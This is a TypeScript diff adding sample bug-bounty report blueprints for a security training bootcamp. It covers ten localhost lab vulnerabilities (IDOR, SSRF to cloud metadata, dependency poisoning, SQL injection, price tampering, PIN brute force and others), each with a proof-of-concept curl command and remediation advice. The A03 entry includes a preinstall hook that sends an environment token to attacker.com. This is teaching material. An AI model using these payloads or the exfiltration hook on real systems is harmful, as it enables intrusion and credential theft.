@@ -79,12 +79,27 @@ export interface RemediationSectionData {
   }>
 }
 
+export interface BugBountyReportData {
+  reportTitle: string
+  severity: 'Critical' | 'High' | 'Medium' | 'Low'
+  cvssVector: string
+  cvssScore: number
+  assetScope: string
+  bountyRange: string
+  summary: string
+  stepsToReproduce: string[]
+  pocCurl: string
+  impact: string
+  remediationRecommendation: string
+}
+
 export interface LabInteractiveCurriculum {
   labId: string
   analogy: AnalogySectionData
   concept: ConceptSectionData
   walkthrough: WalkthroughSectionData
   remediation: RemediationSectionData
+  report?: BugBountyReportData
 }
 
 export const LAB_INTERACTIVE_REGISTRY: Record<string, LabInteractiveCurriculum> = {
@@ -1567,3 +1582,212 @@ export function getInteractiveCurriculumForLab(labId: string, defaultPort = 8011
     },
   }
 }
+
+// Canonical Bug Bounty Report Blueprints for Zitera Bootcamp (A01 - A10)
+// Formatted according to HackerOne / Bugcrowd professional triage standards.
+export const BUG_BOUNTY_REPORT_REGISTRY: Record<string, BugBountyReportData> = {
+  "A01": {
+    reportTitle: "[ApexFin] Insecure Direct Object Reference (BOLA/IDOR) on /wire/{id} allows Unauthorized Financial Wire Voucher Exfiltration",
+    severity: "High",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    cvssScore: 8.6,
+    assetScope: "*.apexfin.com / http://127.0.0.1:8011",
+    bountyRange: "$3,000 – $7,500 USD",
+    summary: "An authenticated user (Alice Vance, junior operations analyst) can view and download confidential wire transfer settlement vouchers of any corporation or executive by tampering with the sequential numeric ID in the /wire/{id} parameter without authorization verification.",
+    stepsToReproduce: [
+      "1. Login to the ApexFin corporate portal using valid low-privileged analyst credentials (alice / password123).",
+      "2. Navigate to the transactions ledger and view the legitimate voucher (URL: http://127.0.0.1:8011/wire/1).",
+      "3. Intercept or tamper with the URL parameter by replacing ID '1' with ID '2' or sovereign executive ID '42'.",
+      "4. Observe that the server returns HTTP 200 OK containing full financial records, sovereign transaction vouchers, and proof tokens belonging to Marcus Reid ($99,999.00)."
+    ],
+    pocCurl: 'curl -s -i "http://127.0.0.1:8011/wire/42" -H "Cookie: session_user=user_sess_1"',
+    impact: "Complete breakdown of multi-tenant transaction confidentiality. Unauthorized competitors or malicious employees can exfiltrate multi-million dollar corporate treasury transfers, violating UU PDP No. 27/2022 and SOX Section 404 financial controls.",
+    remediationRecommendation: "Implement tenant-scoped Object-Level Authorization in the backend data access layer: enforce WHERE wire_id = :id AND tenant_id = :session_tenant_id. Replace sequential numeric integers with non-enumerable cryptographic UUIDv4."
+  },
+  "A02": {
+    reportTitle: "[CloudPulse] Full Server-Side Request Forgery (SSRF) via /api/probe/http leads to Cloud Metadata Exfiltration",
+    severity: "Critical",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
+    cvssScore: 9.8,
+    assetScope: "*.cloudpulse.io / http://127.0.0.1:8012",
+    bountyRange: "$5,000 – $12,000 USD",
+    summary: "The uptime health diagnostic service at POST /api/probe/http accepts arbitrary URLs without loopback (127.0.0.1) or link-local (169.254.169.254) IP range restrictions. An unauthenticated attacker can probe internal cloud infrastructure and steal IAM instance credentials.",
+    stepsToReproduce: [
+      "1. Send an HTTP POST request to http://127.0.0.1:8012/api/probe/http with target_url parameter.",
+      "2. Provide the AWS/Cloud metadata address: target_url=http://169.254.169.254/latest/meta-data/identity-credentials.",
+      "3. Observe that the backend server makes an egress request to the cloud hypervisor metadata socket and reflects the internal AWS secret token in the JSON response."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8012/api/probe/http" -d "target_url=http://169.254.169.254/latest/meta-data/identity-credentials"',
+    impact: "Severe cloud infrastructure compromise. Attackers can leverage the exfiltrated IAM temporary security token to pivot into the production AWS account, dump S3 storage buckets, and modify production workloads.",
+    remediationRecommendation: "Enforce strict IP validation via an egress firewall and an application-layer allowlist. Parse and resolve the hostname before connecting, rejecting private RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and link-local (169.254.0.0/16) IPs. Enforce IMDSv2 with token hops restricted to 1."
+  },
+  "A03": {
+    reportTitle: "[PackNexus] Supply Chain Package Poisoning via Unpinned Dependency Preinstall Exfiltration",
+    severity: "High",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+    cvssScore: 8.8,
+    assetScope: "registry.packnexus.dev / http://127.0.0.1:8013",
+    bountyRange: "$2,500 – $6,000 USD",
+    summary: "The artifact registry allows public registered users to upload packages that shadow internal dependencies (@packnexus/cloud-telemetry). Because the enterprise lockfile lacks cryptographic hash pinning and integrity checksums, CI/CD runners pull the rogue package and execute malicious preinstall hooks.",
+    stepsToReproduce: [
+      "1. Identify unpinned dependencies from the public package audit graph (/audit/graph).",
+      "2. Publish a high-version package (@packnexus/cloud-telemetry v99.9.9) via POST /packages/publish with preinstall hook.",
+      "3. Trigger or simulate CI/CD pipeline build (/build/run).",
+      "4. Observe that the build runner executes the unverified hook and leaks environment tokens."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8013/packages/publish" -d "name=@packnexus/cloud-telemetry&version=99.9.9&hook=curl+attacker.com?leak=$ZITERA_TOKEN"',
+    impact: "Compromise of the entire developer build pipeline. Allows automated insertion of backdoors into customer-facing production binaries and extraction of production database keys.",
+    remediationRecommendation: "Configure private namespace scoping with mandatory artifact repository authentication. Mandate package lockfiles with strict subresource integrity (SRI / SHA-512 hashes). Disable arbitrary lifecycle scripts (--ignore-scripts) in automated build runners."
+  },
+  "A04": {
+    reportTitle: "[SafeKey] Cryptographic Key Failure: Hardcoded HMAC Secret enables Arbitrary Token Forgery & Sovereign Cold Storage Drain",
+    severity: "Critical",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    cvssScore: 9.1,
+    assetScope: "*.safekey.vault / http://127.0.0.1:8014",
+    bountyRange: "$4,000 – $10,000 USD",
+    summary: "SafeKey's public API documentation endpoint (/specs) leaks a hardcoded master cryptographic secret (safekey-master-secret-2026). An unauthenticated attacker can use this secret to sign arbitrary HMAC tokens as 'secops_master' and unlock Marcus Reid's cold storage vault.",
+    stepsToReproduce: [
+      "1. Browse to http://127.0.0.1:8014/specs and inspect the cryptographic implementation details.",
+      "2. Extract the leaked master secret 'safekey-master-secret-2026'.",
+      "3. Generate an HMAC-SHA256 signature for 'secops_master' or request a forged token via POST /api/signer.",
+      "4. Submit the forged token to GET /vault to unlock the sovereign digital asset cold storage seed."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8014/api/signer" -d "signer_id=secops_master&algorithm=HMAC-SHA256"',
+    impact: "Catastrophic loss of digital asset custody. An attacker can authorize irreversible blockchain asset transfers from institutional cold wallets, triggering multi-million dollar insolvency.",
+    remediationRecommendation: "Remove all hardcoded secrets from codebases and documentation. Store master signing keys inside a dedicated Hardware Security Module (HSM) or AWS KMS with asymmetric RSA/ECDSA signing where private keys never leave the hardware boundary."
+  },
+  "A05": {
+    reportTitle: "[DataFlow] SQL Injection via Dynamic Query Concatenation on /deals/search parameter leads to Executive Vault Exfiltration",
+    severity: "Critical",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+    cvssScore: 9.4,
+    assetScope: "*.dataflow-crm.com / http://127.0.0.1:8015",
+    bountyRange: "$3,500 – $8,000 USD",
+    summary: "User input in the deals search query parameter 'q' is directly concatenated into the SQLite database query without parameterized binding, allowing SQL injection via UNION SELECT to exfiltrate secret executive vault records.",
+    stepsToReproduce: [
+      "1. Navigate to http://127.0.0.1:8015/deals/search?q=ApexFin.",
+      "2. Input a single quote \"'\" to provoke a SQL syntax exception.",
+      "3. Append a UNION SELECT payload: ' UNION SELECT 9999, 'VAULT', 'Executive Breach', 999999, 'EXFILTRATED' --.",
+      "4. Inspect the returned JSON or HTML table to view the exfiltrated master audit vault flag."
+    ],
+    pocCurl: "curl -s \"http://127.0.0.1:8015/deals/search?q=%27+UNION+SELECT+9999%2C%27VAULT%27%2C%27BREACH%27%2C999999%2C%27EXFILTRATED%27--\"",
+    impact: "Unrestricted database read/write access. Attackers can dump CRM customer pipelines, sales contracts, executive compensation agreements, and corporate tax records.",
+    remediationRecommendation: "Use parameterized queries (Prepared Statements) exclusively for all database interactions. Replace raw string formatting with ORM query builders (SQLx / Diesel / Prisma) that treat user input strictly as literals."
+  },
+  "A06": {
+    reportTitle: "[NexaStore] Insecure Business Logic Flaw: Client-Side Price & Cart Tampering allows Purchasing $5,000 Sovereign Item for $0.01",
+    severity: "High",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    cvssScore: 8.2,
+    assetScope: "shop.nexastore.com / http://127.0.0.1:8016",
+    bountyRange: "$2,000 – $5,000 USD",
+    summary: "The checkout service at POST /checkout trusts the client-provided cart_total or price_override parameter rather than recalculating the price server-side from the product database, allowing users to buy the $5,000 item with an insufficient wallet balance.",
+    stepsToReproduce: [
+      "1. Add the Master Sovereign Escrow Keycard ($5,000.00) to the cart with a wallet balance of $50.00.",
+      "2. Intercept the checkout request to POST /checkout.",
+      "3. Tamper with the parameter by modifying cart_total=50.00 or price_override=0.01.",
+      "4. The order is fulfilled with status 200 OK and generates order confirmation NEXA-ORD-1042 with the flag."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8016/checkout" -d "item_id=104&cart_total=50.00"',
+    impact: "Direct financial theft and inventory liquidation. Malicious buyers can purchase luxury hardware items for negligible amounts, draining merchant inventory without payment.",
+    remediationRecommendation: "Never trust financial figures submitted by client requests. The server must retrieve item prices strictly from the verified database, sum the total, check wallet funds atomically, and reject requests containing client-side price overrides."
+  },
+  "A07": {
+    reportTitle: "[NexHealth] Authentication Failure: Predictable 4-Digit Onboarding PIN & Zero Rate-Limiting enables Hospital Account Takeover",
+    severity: "High",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    cvssScore: 8.1,
+    assetScope: "ehr.nexhealth.org / http://127.0.0.1:8017",
+    bountyRange: "$2,500 – $6,500 USD",
+    summary: "Physician authentication endpoints (/login and /api/login) lack brute-force rate-limiting and account lockout. Medical staff onboarding memos reveal that newly provisioned physician PINs follow the deployment year (2026), enabling trivial account takeover of the Chief Medical Officer.",
+    stepsToReproduce: [
+      "1. Review staff directory on the portal and identify Dr. Marcus Reid (username: admin or mreid).",
+      "2. Send automated POST requests to /api/login with candidate 4-digit PINs without encountering rate limits.",
+      "3. Submit PIN '2026' to successfully obtain the authentication session cookie nexhealth_session.",
+      "4. Access /records/vault to retrieve confidential clinical research trials and the verification flag."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8017/api/login" -H "Content-Type: application/json" -d \'{"username":"mreid","password":"2026"}\'',
+    impact: "Breach of protected health information (PHI) under HIPAA and UU PDP. Unauthorized actors can view sensitive medical diagnoses, manipulate patient prescriptions, and compromise clinical trial integrity.",
+    remediationRecommendation: "Enforce exponential backoff and IP-based rate limiting (max 5 attempts per 15 minutes). Require multi-factor authentication (MFA/TOTP) for medical staff, and mandate strong initial passwords with mandatory password reset on first login."
+  },
+  "A08": {
+    reportTitle: "[DataFlow Analytics] Software & Data Integrity Failure: Unsigned Configuration Package Ingestion leads to Runtime Kernel Manipulation",
+    severity: "Critical",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
+    cvssScore: 9.0,
+    assetScope: "bi.dataflow.net / http://127.0.0.1:8018",
+    bountyRange: "$4,000 – $9,000 USD",
+    summary: "The analytics engine at POST /api/deploy_update ingests configuration packages directly into active memory without verifying digital signatures or HMAC integrity digests. Submitting a manifest with signature_verified=false and debug_backdoor=true unlocks the master analytics kernel.",
+    stepsToReproduce: [
+      "1. Inspect the active device configuration via GET /api/config.",
+      "2. Craft a malicious configuration JSON payload with 'version': '3.0-untrusted' and 'debug_backdoor': true.",
+      "3. Submit the payload to POST /api/deploy_update.",
+      "4. The engine accepts the unverified manifest and responds with status 'applied' and reveals the master flag."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8018/api/deploy_update" -H "Content-Type: application/json" -d \'{"version":"3.0-untrusted","signature_verified":false,"signer":"evil-hacker","params":{"debug_backdoor":true}}\'',
+    impact: "Unauthorized execution of kernel debug routines and tampering with analytical models, corrupting corporate quarterly forecasting and investor financial disclosures.",
+    remediationRecommendation: "Implement asymmetric digital signature verification (Ed25519 or RSA-PSS). Compute SHA-256 digests of all configuration manifests and verify against a trusted Root CA certificate before deserialization."
+  },
+  "A09": {
+    reportTitle: "[FleetTrack] Security Logging & Alerting Blindspot: Brute-Force Attacks & Privilege Escalation Completely Omitted from SIEM Logs",
+    severity: "Medium",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+    cvssScore: 6.5,
+    assetScope: "telematics.fleettrack.com / http://127.0.0.1:8019",
+    bountyRange: "$1,500 – $3,500 USD",
+    summary: "Authentication failures on /api/auth/login and critical privilege escalations on /api/admin/role_escalate are completely omitted from the security audit trail. SOC analysts observe zero alerts while attackers escalate to super_admin unnoticed.",
+    stepsToReproduce: [
+      "1. Execute 5 consecutive failed login attempts via POST /api/auth/login.",
+      "2. Check the SOC audit trail via GET /api/audit/logs and verify that no failed login events were recorded.",
+      "3. Execute a silent privilege escalation request to POST /api/admin/role_escalate with role=super_admin.",
+      "4. The system grants super_admin privileges with zero SIEM alert generation and unlocks the incident flag."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8019/api/admin/role_escalate" -H "Content-Type: application/json" -d \'{"user":"pentester","role":"super_admin"}\'',
+    impact: "Extreme security blindspots that extend attacker dwell time. Unauthorized adversaries can maintain persistent administrative access and alter logistics transport routes without triggering SOC alarms.",
+    remediationRecommendation: "Establish centralized tamper-evident audit logging using write-once append-only storage (WORM). Configure SIEM threshold rules (e.g., >5 failed logins within 60s triggers High severity incident). Mandate real-time alerts for all privilege change events."
+  },
+  "A10": {
+    reportTitle: "[TemplateCloud] Mishandling of Exceptional Conditions: Upstream Parser Exception triggers Fail-Open Authorization Bypass",
+    severity: "Critical",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    cvssScore: 9.1,
+    assetScope: "pay.templatecloud.io / http://127.0.0.1:8020",
+    bountyRange: "$3,500 – $8,500 USD",
+    summary: "The payment verification gateway at POST /api/gate/verify implements a dangerous fail-open exception pattern: when an unhandled upstream timeout, malformed payload, or null token is received, the generic catch block defaults to ALLOW_ACCESS = true to avoid losing transactions, allowing complete authorization bypass.",
+    stepsToReproduce: [
+      "1. Send a nominal unauthorized token to POST /api/gate/verify and observe HTTP 200 with authorized=false.",
+      "2. Send a request with simulate_exception=UPSTREAM_GATEWAY_TIMEOUT or a null token parameter.",
+      "3. The server catches the exception and falls back to fail-open (authorized=true, fail_open_state=true).",
+      "4. Full settlement access is granted and the master flag is returned."
+    ],
+    pocCurl: 'curl -s -X POST "http://127.0.0.1:8020/api/gate/verify" -H "Content-Type: application/json" -d \'{"simulate_exception":"UPSTREAM_GATEWAY_TIMEOUT"}\'',
+    impact: "Complete breakdown of payment verification. Attackers can settle transactions for free by purposely injecting malformed tokens to trigger upstream exceptions, causing catastrophic merchant revenue loss.",
+    remediationRecommendation: "Enforce strict Fail-Closed design across all security barriers: authorization decision variables must be initialized to FALSE and only become TRUE after positive, verified completion. Exception handlers must return HTTP 503/504 with access denied."
+  }
+}
+
+export function getBugBountyReportForLab(labId: string, defaultPort = 8011): BugBountyReportData {
+  if (BUG_BOUNTY_REPORT_REGISTRY[labId]) {
+    return BUG_BOUNTY_REPORT_REGISTRY[labId]
+  }
+
+  return {
+    reportTitle: `[Zitera Lab ${labId}] Security Assessment Vulnerability Report`,
+    severity: "High",
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    cvssScore: 7.5,
+    assetScope: `target.zitera.local / http://127.0.0.1:${defaultPort}`,
+    bountyRange: "$2,000 – $5,000 USD",
+    summary: `A high-severity vulnerability was identified in Lab ${labId} allowing unauthorized extraction of sensitive system state.`,
+    stepsToReproduce: [
+      "1. Identify sensitive endpoints on the target service.",
+      "2. Send test payloads via cURL or browser devtools.",
+      "3. Observe lack of server-side validation and capture proof of concept."
+    ],
+    pocCurl: `curl -s -i "http://127.0.0.1:${defaultPort}/"`,
+    impact: "Potential compromise of system confidentiality and unauthorized access to application data.",
+    remediationRecommendation: "Enforce defensive server-side authorization and strict input validation."
+  }
+}
+
